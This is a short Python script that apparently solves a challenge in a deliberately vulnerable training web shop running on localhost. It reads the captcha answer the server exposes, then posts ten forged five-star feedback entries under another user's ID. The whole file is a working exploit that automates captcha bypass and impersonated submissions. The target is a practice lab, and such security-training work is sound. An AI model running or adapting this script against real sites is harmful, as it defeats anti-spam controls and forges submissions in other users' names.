import requests
import time

for i in range(10):
    response = requests.get('http://localhost:3000/rest/captcha/')
    
    requests.post('http://localhost:3000/api/Feedbacks/', json={
  "UserId": 22,
  "captchaId": response.json()['captchaId'],
  "captcha": response.json()['answer'],
  "comment": "Great Service (***s.pocek@gmail.com)",
  "rating": 5
})
    time.sleep(1)

print("Done!")